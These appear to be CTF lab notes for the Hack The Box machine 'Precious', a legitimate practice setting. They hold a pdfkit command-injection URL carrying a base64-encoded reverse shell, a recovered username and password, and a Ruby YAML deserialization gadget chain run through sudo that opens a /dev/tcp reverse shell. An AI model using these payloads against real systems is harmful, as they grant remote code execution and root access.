# HTB new box presious

Nmap first 1000 tcp port scan 
```
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Did not follow redirect to http://precious.htb/
```

Nmap full port scan 65535
only two port open

Backend

nginx proxy + Phusion Passenger(R) 6.0.15{latest version} webapplication server with ruby

# Main function of webapp

Convert html to pdf

Coverter wkhtmltopdf 0.12.6 {Commandline tool}
Pdf generator pdfkit v0.8.6

Exploit Command Injection pdfkit {Affected versions of this package are vulnerable to Command Injection where the URL is not properly sanitized}

Referance 1
https://github.com/pdfkit/pdfkit/issues/517

Referance 2
https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795

#payload
http://10.10.16.22/?name=#{'%20`echo "YmFzaCAtaSAgPiYgL2Rldi90Y3AvMTAuMTAuMTYuMjIvOTAwMSAgMD4mMSAg" | base64 -d | bash\`'}

User ruby to henry
creds from ruby home dir .config/config
henry:Q3c1AqGHtoI0aXAYFH

# Privilege escalation

# YAML Deserialization
Referances https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/

Deserialization payload
https://gist.github.com/staaldraad/89dffe369e1454eedd3306edc8a7e565#file-ruby_yaml_load_sploit2-yaml

# exploit
Create a dependencies.yml file in any writeable dir and run update_dependencies.rb in same dir with sudo 
sudo /usr/bin/ruby /opt/update_dependencies.rb

# payload => dependencies.yml
```ymal
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: "bash -c 'bash -i >& /dev/tcp/10.10.16.22/9001 0>&1'"
         method_id: :resolve
```
